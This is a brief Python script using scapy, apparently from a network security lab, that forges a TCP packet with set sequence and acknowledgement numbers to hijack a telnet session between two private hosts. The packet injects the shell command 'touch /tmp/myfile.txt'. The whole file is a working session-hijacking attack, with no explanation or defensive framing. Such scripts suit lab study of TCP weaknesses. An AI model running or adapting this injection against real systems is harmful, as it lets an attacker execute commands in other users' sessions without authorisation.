#!/usr/bin/python3
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")

ip  = IP(src="172.17.0.4", dst="172.17.0.3")
tcp = TCP(sport=40480,dport=23, flags="A", seq=415135320, ack=2836982987)

data = "\n touch /tmp/myfile.txt\n"
pkt = ip/tcp/data
send(pkt, verbose=0)

